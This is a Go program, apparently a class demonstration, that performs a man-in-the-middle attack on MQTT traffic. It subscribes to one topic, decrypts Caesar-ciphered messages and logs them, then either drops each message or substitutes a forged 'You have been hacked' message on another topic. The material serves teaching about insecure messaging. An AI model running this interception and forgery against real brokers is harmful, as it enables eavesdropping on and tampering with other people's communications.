package main

import (
	"flag"
	"log"
	"os"

	"github.com/Lemos1347/ClassMITM-MQTT/internal/caesar_cipher"
	mqtt "github.com/eclipse/paho.mqtt.golang"
	"github.com/joho/godotenv"
)

var hijack bool

func init() {
	envPath := flag.String("env", "./.env", "Path for .env file")
	hijackPtr := flag.Bool("hijack", false, "Hijack messages mode")
	flag.Parse()

	if hijackPtr == nil {
		hijack = false
	} else {
		hijack = *hijackPtr
		log.Printf("Mode: %t", hijack)
	}
	godotenv.Load(*envPath)
}

func main() {
	broker, ok := os.LookupEnv("BROKER_URL")
	if !ok {
		log.Fatal("BROKER_URL not set")
	}
	clientID := "go-mqtt-client"
	topicSubscribe := "/listener"
	topicPublish := "/caller"
	username, ok := os.LookupEnv("BROKER_USERNAME")
	if !ok {
		log.Fatal("BROKER_USERNAME not set")
	}
	password, ok := os.LookupEnv("BROKER_PASSWORD")
	if !ok {
		log.Fatal("BROKER_PASSWORD not set")
	}

	opts := mqtt.NewClientOptions()
	opts.AddBroker(broker)
	opts.SetClientID(clientID)
	opts.SetUsername(username)
	opts.SetPassword(password)

	client := mqtt.NewClient(opts)
	if token := client.Connect(); token.Wait() && token.Error() != nil {
		log.Fatalf("Error connecting to the MQTT broker: %v", token.Error())
	}
	defer client.Disconnect(250)

	client.Subscribe(topicSubscribe, 0, func(client mqtt.Client, msg mqtt.Message) {
		log.Printf("Message received on the topic: %s: %s", msg.Topic(), msg.Payload())

		caeserCipher := caesar_cipher.CaesarCipher{}

		decryptedMessage := caeserCipher.Decrypt(string(msg.Payload()), true)
		log.Printf("Decoded message: %s", decryptedMessage)

		if hijack {
			log.Println("Message hijacked with success!")
			return
		}

		modifiedMessage := "You have been hacked"

		reEncryptedMessage := caeserCipher.Encrypt(modifiedMessage)
		log.Printf("Message re-encrypted with the same shift: %s", reEncryptedMessage)

		token := client.Publish(topicPublish, 0, false, reEncryptedMessage)
		token.Wait()
		if token.Error() != nil {
			log.Printf("Error publishing message: %v", token.Error())
		} else {
			log.Printf("Message published on the topic: %s: %s", topicPublish, reEncryptedMessage)
		}
	})

	log.Printf("Listening topic %s and publishing at %s...", topicSubscribe, topicPublish)
	select {}

}
